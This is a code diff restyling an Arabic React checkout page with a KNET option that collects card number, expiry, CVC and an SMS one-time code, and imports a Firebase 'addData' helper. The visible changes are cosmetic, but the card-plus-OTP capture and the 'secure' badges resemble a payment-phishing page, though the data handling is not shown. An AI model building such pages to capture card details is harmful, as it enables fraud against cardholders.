@@ -1,8 +1,20 @@
 "use client"
 
+import type React from "react"
+
 import { useState, useRef, useEffect } from "react"
-import { CreditCard, Wallet, Check, Shield, Download, ChevronRight, AlertCircle, Info, Lock } from 'lucide-react'
-import Image from "next/image"
+import {
+  Wallet,
+  Check,
+  Shield,
+  Download,
+  ChevronRight,
+  AlertCircle,
+  Info,
+  Lock,
+  ArrowRight,
+  CreditCardIcon,
+} from "lucide-react"
 import { useRouter } from "next/navigation"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
@@ -19,13 +31,11 @@ import {
   DialogHeader,
   DialogTitle,
 } from "@/components/ui/dialog"
-import { Loader } from "@/components/Loader"
+import { Separator } from "@/components/ui/separator"
 import { addData } from "@/lib/firebasee"
 
 // Payment flow states
 type PaymentState = "FORM" | "OTP" | "SUCCESS"
-
-// Generate order ID
 
 export default function PaymentMethods() {
   const [paymentMethod, setPaymentMethod] = useState<string | null>(null)
@@ -57,11 +67,11 @@ export default function PaymentMethods() {
   // Initialize order details from localStorage on client-side only
   useEffect(() => {
     try {
-      const storedAmount = localStorage.getItem('amount')
+      const storedAmount = localStorage.getItem("amount")
       if (storedAmount) {
-        setOrderDetails(prev => ({
+        setOrderDetails((prev) => ({
           ...prev,
-          total: storedAmount
+          total: storedAmount,
         }))
       }
     } catch (error) {
@@ -131,8 +141,6 @@ export default function PaymentMethods() {
     } else if (cardCvc.length < 3) {
       errors.cardCvc = "رمز الأمان غير صحيح"
     }
-
-    
 
     setFormErrors(errors)
     return Object.keys(errors).length === 0
@@ -258,42 +266,70 @@ export default function PaymentMethods() {
 
   // Progress indicator
   const renderProgressIndicator = () => (
-    <div className="flex items-center justify-between mb-6 px-2">
+    <div className="flex items-center justify-between mb-8 px-2">
       <div className="flex flex-col items-center">
         <div
-          className={`w-8 h-8 rounded-full flex items-center justify-center ${
-            paymentState === "FORM" ? "bg-primary text-primary-foreground" : "bg-primary text-primary-foreground"
+          className={`w-10 h-10 rounded-full flex items-center justify-center transition-all duration-300 ${
+            paymentState === "FORM"
+              ? "bg-primary text-primary-foreground shadow-md"
+              : "bg-primary text-primary-foreground shadow-md"
           }`}
         >
-          1
+          <span className="text-sm font-medium">1</span>
         </div>
-        <span className="text-xs mt-1">الدفع</span>
+        <span className="text-xs mt-2 font-medium">الدفع</span>
       </div>
-      <div className={`h-0.5 flex-1 mx-2 ${paymentState !== "FORM" ? "bg-primary" : "bg-muted"}`}></div>
+      <div
+        className={`h-1 flex-1 mx-2 rounded-full transition-all duration-300 ${paymentState !== "FORM" ? "bg-primary" : "bg-muted"}`}
+      ></div>
       <div className="flex flex-col items-center">
         <div
-          className={`w-8 h-8 rounded-full flex items-center justify-center ${
+          className={`w-10 h-10 rounded-full flex items-center justify-center transition-all duration-300 ${
             paymentState === "OTP"
-              ? "bg-primary text-primary-foreground"
+              ? "bg-primary text-primary-foreground shadow-md"
               : paymentState === "SUCCESS"
-                ? "bg-primary text-primary-foreground"
+                ? "bg-primary text-primary-foreground shadow-md"
                 : "bg-muted text-muted-foreground"
           }`}
         >
-          2
+          <span className="text-sm font-medium">2</span>
         </div>
-        <span className="text-xs mt-1">التحقق</span>
+        <span className="text-xs mt-2 font-medium">التحقق</span>
       </div>
-      <div className={`h-0.5 flex-1 mx-2 ${paymentState === "SUCCESS" ? "bg-primary" : "bg-muted"}`}></div>
+      <div
+        className={`h-1 flex-1 mx-2 rounded-full transition-all duration-300 ${paymentState === "SUCCESS" ? "bg-primary" : "bg-muted"}`}
+      ></div>
       <div className="flex flex-col items-center">
         <div
-          className={`w-8 h-8 rounded-full flex items-center justify-center ${
-            paymentState === "SUCCESS" ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"
+          className={`w-10 h-10 rounded-full flex items-center justify-center transition-all duration-300 ${
+            paymentState === "SUCCESS"
+              ? "bg-primary text-primary-foreground shadow-md"
+              : "bg-muted text-muted-foreground"
           }`}
         >
-          3
+          <span className="text-sm font-medium">3</span>
         </div>
-        <span className="text-xs mt-1">التأكيد</span>
+        <span className="text-xs mt-2 font-medium">التأكيد</span>
+      </div>
+    </div>
+  )
+
+  // Render order summary
+  const renderOrderSummary = () => (
+    <div className="bg-muted/20 rounded-xl p-5 mb-6 border border-muted/50">
+      <h3 className="font-medium text-sm mb-3 text-muted-foreground">ملخص الطلب</h3>
+      <div className="space-y-3">
+        <div className="flex justify-between items-center">
+          <span className="text-sm">رقم الطلب:</span>
+          <span className="font-medium">{orderDetails.id}</span>
+        </div>
+        <Separator className="bg-muted/30" />
+        <div className="flex justify-between items-center">
+          <span className="text-sm">المبلغ الإجمالي:</span>
+          <span className="font-bold text-lg">
+            {orderDetails.total} {currency === "sar" ? "د.ك" : "$"}
+          </span>
+        </div>
       </div>
     </div>
   )
@@ -301,37 +337,42 @@ export default function PaymentMethods() {
   // Render success state
   const renderSuccessState = () => (
     <>
-      <CardHeader className="space-y-1 pb-2">
+      <CardHeader className="space-y-1 pb-4">
         <CardTitle className="text-2xl font-bold text-center">تم الدفع بنجاح</CardTitle>
         <CardDescription className="text-center">شكراً لك، تمت عملية الدفع بنجاح</CardDescription>
       </CardHeader>
       <CardContent className="space-y-6">
         {renderProgressIndicator()}
 
-        <div className="flex justify-center my-6">
-          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
-            <Check className="h-8 w-8 text-green-600" />
+        <div className="flex justify-center my-8">
+          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center animate-in zoom-in-50 duration-300">
+            <Check className="h-10 w-10 text-green-600" />
           </div>
         </div>
 
-        <div className="bg-muted/30 rounded-lg p-4 mb-4">
-          <div className="flex justify-between items-center mb-2">
-            <span className="text-sm text-muted-foreground">رقم الطلب:</span>
-            <span className="font-medium">{orderDetails.id}</span>
-          </div>
-          <div className="flex justify-between items-center mb-2">
-            <span className="text-sm text-muted-foreground">تاريخ الدفع:</span>
-            <span className="font-medium">{getCurrentDate()}</span>
-          </div>
-          <div className="flex justify-between items-center">
-            <span className="text-sm text-muted-foreground">المبلغ الإجمالي:</span>
-            <span className="font-bold">
-              {orderDetails.total} {currency === "sar" ? "د.ك" : "$"}
-            </span>
+        <div className="bg-muted/20 rounded-xl p-5 mb-6 border border-muted/50 animate-in fade-in-50 duration-300">
+          <h3 className="font-medium text-sm mb-3 text-muted-foreground">تفاصيل الدفع</h3>
+          <div className="space-y-3">
+            <div className="flex justify-between items-center">
+              <span className="text-sm">رقم الطلب:</span>
+              <span className="font-medium">{orderDetails.id}</span>
+            </div>
+            <Separator className="bg-muted/30" />
+            <div className="flex justify-between items-center">
+              <span className="text-sm">تاريخ الدفع:</span>
+              <span className="font-medium">{getCurrentDate()}</span>
+            </div>
+            <Separator className="bg-muted/30" />
+            <div className="flex justify-between items-center">
+              <span className="text-sm">المبلغ الإجمالي:</span>
+              <span className="font-bold text-lg">
+                {orderDetails.total} {currency === "sar" ? "د.ك" : "$"}
+              </span>
+            </div>
           </div>
         </div>
 
-        <div className="text-center text-sm text-muted-foreground">
+        <div className="text-center text-sm text-muted-foreground bg-muted/10 p-4 rounded-lg">
           <p>تم إرسال تفاصيل الدفع إلى بريدك الإلكتروني</p>
         </div>
       </CardContent>
@@ -345,7 +386,7 @@ export default function PaymentMethods() {
             <ChevronRight className="h-5 w-5" />
           </span>
         </Button>
-        <Button variant="outline" className="w-full" onClick={() => window.print()}>
+        <Button variant="outline" className="w-full h-12 border-dashed" onClick={() => window.print()}>
           <span className="flex items-center gap-2">
             <Download className="h-4 w-4" />
             طباعة الإيصال
@@ -356,18 +397,21 @@ export default function PaymentMethods() {
   )
 
   return (
-    <div className="flex justify-center items-center min-h-screen bg-gradient-to-b from-gray-50 to-gray-100" dir="rtl">
-      <Card className="w-full max-w-md shadow-xl border-0 overflow-hidden">
-        <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-primary to-primary-foreground"></div>
+    <div
+      className="flex justify-center items-center min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 p-4"
+      dir="rtl"
+    >
+      <Card className="w-full max-w-md shadow-2xl border-0 overflow-hidden rounded-xl animate-in fade-in-50 duration-300">
+        <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-primary via-primary to-primary/80"></div>
 
         {paymentState === "FORM" && (
           <>
-            <CardHeader className="space-y-1 pb-2">
+            <CardHeader className="space-y-1 pb-4">
               <div className="flex justify-between items-center">
                 <CardTitle className="text-2xl font-bold">إتمام الدفع</CardTitle>
                 <Badge
                   variant="outline"
-                  className="flex items-center gap-1 px-2 py-1 bg-green-50 text-green-700 border-green-200"
+                  className="flex items-center gap-1 px-2.5 py-1.5 bg-green-50 text-green-700 border-green-200 rounded-lg"
                 >
                   <Shield className="h-3 w-3" /> آمن
                 </Badge>
@@ -376,38 +420,41 @@ export default function PaymentMethods() {
             </CardHeader>
             <CardContent className="space-y-6">
               {renderProgressIndicator()}
+              {renderOrderSummary()}
 
-              <div className="bg-muted/30 rounded-lg p-4 mb-6">
-                <div className="flex justify-between items-center mb-2">
-                  <span className="text-sm text-muted-foreground">رقم الطلب:</span>
-                  <span className="font-medium">{orderDetails.id}</span>
-                </div>
-                <div className="flex justify-between items-center">
-                  <span className="text-sm text-muted-foreground">المبلغ الإجمالي:</span>
-                  <span className="font-bold">
-                    {orderDetails.total} {currency === "sar" ? "د.ك" : "$"}
-                  </span>
-                </div>
-              </div>
-
-              <div>
+              <div className="space-y-4">
                 <h3 className="font-medium mb-3">طريقة الدفع</h3>
                 <RadioGroup value={paymentMethod || ""} onValueChange={setPaymentMethod} className="grid gap-4">
-                  <div className="grid gap-6">
+                  <div className="grid gap-4">
                     <div className="relative">
                       <div
-                        className={`absolute inset-0 rounded-lg transition-all duration-200 ${
+                        className={`absolute inset-0 rounded-xl transition-all duration-200 ${
                           paymentMethod === "card" ? "ring-2 ring-primary" : ""
                         }`}
                       ></div>
-                      
+                      <div className="flex items-center space-x-2 relative">
+                        <RadioGroupItem value="card" id="card" />
+                        <Label
+                          htmlFor="card"
+                          className="flex items-center gap-2 cursor-pointer rounded-xl border border-muted p-4 hover:bg-muted/20 transition-colors w-full"
+                        >
+                          <div className="bg-gradient-to-r from-primary/90 to-primary text-white p-2 rounded-lg shadow-sm">
+                            <CreditCardIcon className="h-5 w-5" />
+                          </div>
+                          <div className="font-medium">بطاقة ائتمان</div>
+                          <div className="flex gap-1 mr-auto">
+                            <img src="visa.svg" alt="logo" className="w-8 h-5 rounded"/>
+                            <img src="master.svg" alt="logo" className="w-8 h-5 rounded"/>
+                          </div>
+                        </Label>
+                      </div>
                     </div>
 
                     {paymentMethod === "card" && (
-                      <div className="grid gap-4 pr-6 animate-in fade-in-50 duration-300" dir="rtl">
+                      <div className="grid gap-5 pr-6 animate-in fade-in-50 duration-300 pt-2" dir="rtl">
                         <div className="grid gap-2">
                           <div className="flex items-center justify-between">
-                            <Label htmlFor="card-number" className="flex items-center gap-1">
+                            <Label htmlFor="card-number" className="flex items-center gap-1 text-sm">
                               رقم البطاقة
                               <TooltipProvider>
                                 <Tooltip>
@@ -433,17 +480,19 @@ export default function PaymentMethods() {
                               value={cardNumber}
                               onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                               maxLength={19}
-                              className={formErrors.cardNumber ? "border-destructive pr-10" : ""}
+                              className={`${formErrors.cardNumber ? "border-destructive" : ""} pr-10 rounded-lg h-11 transition-all duration-200 focus:ring-2 focus:ring-primary/20`}
                             />
                             <div className="absolute left-3 top-1/2 -translate-y-1/2">
-                              <div className="w-6 h-4 bg-blue-600 rounded"></div>
+                              <div className="w-8 h-5 bg-blue-600 rounded"></div>
                             </div>
                           </div>
                         </div>
                         <div className="grid grid-cols-2 gap-4">
                           <div className="grid gap-2">
                             <div className="flex items-center justify-between">
-                              <Label htmlFor="expiry">تاريخ الانتهاء</Label>
+                              <Label htmlFor="expiry" className="text-sm">
+                                تاريخ الانتهاء
+                              </Label>
                               {formErrors.cardExpiry && (
                                 <span className="text-xs text-destructive flex items-center gap-1">
                                   <AlertCircle className="h-3 w-3" /> {formErrors.cardExpiry}
@@ -457,12 +506,14 @@ export default function PaymentMethods() {
                               value={cardExpiry}
                               onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                               maxLength={5}
-                              className={formErrors.cardExpiry ? "border-destructive" : ""}
+                              className={`${formErrors.cardExpiry ? "border-destructive" : ""} rounded-lg h-11 transition-all duration-200 focus:ring-2 focus:ring-primary/20`}
                             />
                           </div>
                           <div className="grid gap-2">
                             <div className="flex items-center justify-between">
-                              <Label htmlFor="cvc">رمز التحقق</Label>
+                              <Label htmlFor="cvc" className="text-sm">
+                                رمز التحقق
+                              </Label>
                               {formErrors.cardCvc && (
                                 <span className="text-xs text-destructive flex items-center gap-1">
                                   <AlertCircle className="h-3 w-3" /> {formErrors.cardCvc}
@@ -476,17 +527,16 @@ export default function PaymentMethods() {
                               maxLength={4}
                               value={cardCvc}
                               onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ""))}
-                              className={formErrors.cardCvc ? "border-destructive" : ""}
+                              className={`${formErrors.cardCvc ? "border-destructive" : ""} rounded-lg h-11 transition-all duration-200 focus:ring-2 focus:ring-primary/20`}
                             />
                           </div>
                         </div>
-                     
                       </div>
                     )}
 
                     <div className="relative">
                       <div
-                        className={`absolute inset-0 rounded-lg transition-all duration-200 ${
+                        className={`absolute inset-0 rounded-xl transition-all duration-200 ${
                           paymentMethod === "paypal" ? "ring-2 ring-primary" : ""
                         }`}
                       ></div>
@@ -494,15 +544,15 @@ export default function PaymentMethods() {
                         <RadioGroupItem value="paypal" id="paypal" />
                         <Label
                           htmlFor="paypal"
-                          className="flex items-center gap-2 cursor-pointer rounded-lg border border-muted p-4 hover:bg-muted/30 transition-colors w-full"
+                          className="flex items-center gap-2 cursor-pointer rounded-xl border border-muted p-4 hover:bg-muted/20 transition-colors w-full"
                         >
-                          <div className="bg-gradient-to-r from-blue-700 to-blue-900 text-white p-2 rounded-md">
+                          <div className="bg-gradient-to-r from-blue-700 to-blue-900 text-white p-2 rounded-lg shadow-sm">
                             <Wallet className="h-5 w-5" />
                           </div>
                           <div className="font-medium">كي نت</div>
                           <div className="flex gap-1 mr-auto">
                             <div className="w-8 h-5 bg-blue-800 rounded">
-                              <Image src="/kv.png" alt="KNET" width={32} height={20} />
+                              <img src="/kv.png" alt="KNET" width={32} height={20} />
                             </div>
                           </div>
                         </Label>
@@ -514,7 +564,7 @@ export default function PaymentMethods() {
             </CardContent>
             <CardFooter className="flex flex-col gap-4">
               <Button
-                className="w-full h-12 text-base font-medium shadow-md hover:shadow-lg transition-all"
+                className="w-full h-12 text-base font-medium shadow-md hover:shadow-lg transition-all rounded-lg"
                 disabled={!paymentMethod || isProcessing}
                 onClick={handlePayment}
               >
@@ -545,11 +595,11 @@ export default function PaymentMethods() {
                 ) : (
                   <span className="flex items-center gap-2">
                     ادفع الآن
-                    <ChevronRight className="h-5 w-5" />
+                    <ArrowRight className="h-5 w-5" />
                   </span>
                 )}
               </Button>
-              <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
+              <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground bg-muted/10 p-2 rounded-lg">
                 <Shield className="h-3 w-3" />
                 <span>جميع المعاملات مشفرة وآمنة</span>
               </div>
@@ -561,26 +611,29 @@ export default function PaymentMethods() {
 
         {/* OTP Dialog */}
         <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
-          <DialogContent className="sm:max-w-md" dir="rtl">
+          <DialogContent className="sm:max-w-md rounded-xl" dir="rtl">
             <DialogHeader>
               <DialogTitle className="text-xl font-bold">التحقق من الدفع</DialogTitle>
               <DialogDescription>أدخل رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك</DialogDescription>
             </DialogHeader>
 
-            <div className="bg-muted/30 rounded-lg p-4 mb-4">
-              <div className="flex justify-between items-center mb-2">
-                <span className="text-sm text-muted-foreground">رقم الطلب:</span>
-                <span className="font-medium">{orderDetails.id}</span>
-              </div>
-              <div className="flex justify-between items-center">
-                <span className="text-sm text-muted-foreground">المبلغ الإجمالي:</span>
-                <span className="font-bold">
-                  {orderDetails.total} {currency === "sar" ? "د.ك" : "$"}
-                </span>
+            <div className="bg-muted/20 rounded-xl p-4 mb-4 border border-muted/50">
+              <div className="space-y-3">
+                <div className="flex justify-between items-center">
+                  <span className="text-sm text-muted-foreground">رقم الطلب:</span>
+                  <span className="font-medium">{orderDetails.id}</span>
+                </div>
+                <Separator className="bg-muted/30" />
+                <div className="flex justify-between items-center">
+                  <span className="text-sm text-muted-foreground">المبلغ الإجمالي:</span>
+                  <span className="font-bold">
+                    {orderDetails.total} {currency === "sar" ? "د.ك" : "$"}
+                  </span>
+                </div>
               </div>
             </div>
 
-            <div className="text-center mb-2">
+            <div className="text-center mb-4 bg-primary/5 p-3 rounded-lg">
               <p className="text-sm mb-1">تم إرسال رمز التحقق إلى</p>
               <p className="font-medium">+965 5XX XXX XX89</p>
             </div>
@@ -596,7 +649,9 @@ export default function PaymentMethods() {
                     value={value}
                     onChange={(e) => handleOtpChange(index, e.target.value)}
                     onKeyDown={(e) => handleKeyDown(index, e)}
-                    className={`w-12 h-14 text-center text-lg font-bold ${otpError ? "border-destructive" : ""}`}
+                    className={`w-12 h-14 text-center text-lg font-bold rounded-lg ${
+                      otpError ? "border-destructive" : ""
+                    } transition-all duration-200 focus:ring-2 focus:ring-primary/20`}
                   />
                   {index < 5 && <div className="absolute left-[-8px] top-1/2 w-4 h-[1px] bg-muted-foreground/30"></div>}
                 </div>
@@ -604,7 +659,7 @@ export default function PaymentMethods() {
             </div>
 
             {otpError && (
-              <div className="bg-destructive/10 text-destructive rounded-md p-2 text-center text-sm flex items-center justify-center gap-1">
+              <div className="bg-destructive/10 text-destructive rounded-lg p-3 text-center text-sm flex items-center justify-center gap-1">
                 <AlertCircle className="h-4 w-4" />
                 {otpError}
               </div>
@@ -619,13 +674,32 @@ export default function PaymentMethods() {
 
             <DialogFooter className="sm:justify-center">
               <Button
-                className="w-full h-12 text-base font-medium shadow-md hover:shadow-lg transition-all"
+                className="w-full h-12 text-base font-medium shadow-md hover:shadow-lg transition-all rounded-lg"
                 disabled={otpValues.some((v) => !v) || isProcessing}
                 onClick={verifyOtp}
               >
                 {isProcessing ? (
                   <span className="flex items-center gap-2">
-                    <Loader className="mr-2" />
+                    <svg
+                      className="animate-spin -ml-1 mr-2 h-4 w-4 text-white"
+                      xmlns="http://www.w3.org/2000/svg"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                    >
+                      <circle
+                        className="opacity-25"
+                        cx="12"
+                        cy="12"
+                        r="10"
+                        stroke="currentColor"
+                        strokeWidth="4"
+                      ></circle>
+                      <path
+                        className="opacity-75"
+                        fill="currentColor"
+                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                      ></path>
+                    </svg>
                     جاري التحقق...
                   </span>
                 ) : (
